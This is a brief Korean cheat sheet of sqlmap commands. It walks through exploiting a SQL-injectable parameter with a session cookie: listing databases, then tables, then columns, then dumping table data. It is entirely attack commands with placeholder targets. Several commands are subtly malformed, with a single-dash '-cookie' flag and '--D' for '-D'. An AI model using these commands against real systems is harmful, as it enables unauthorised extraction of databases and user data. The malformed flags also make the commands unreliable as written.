```
sqlmap -u "[URL]" -p [취약 파라미터] -cookie="[세션값]" --dbs 
```
만약에 POST 면 --data="[파라미터]"

DB 고르고 테이블 조회하기
```
sqlmap -u "[URL]" -p [취약 파라미터] -cookie="[세션값]" -D [DB명] --tables
```

특정 테이블의 컬럼 조회하기
```
sqlmap -u "[URL]" -p [취약 파라미터] -cookie="[세션값]" --D [DB명] -T [테이블명] --columns
```
데이터 보려면
```
sqlmap -u "[URL]" -p [취약 파라미터] -cookie="[세션값]" --D [DB명] -T [테이블명] --dump

sqlmap -u "[URL]" -p [취약 파라미터] -cookie="[세션값]" --D [DB명] -T [테이블명] -C [컬럼명] --dump
```
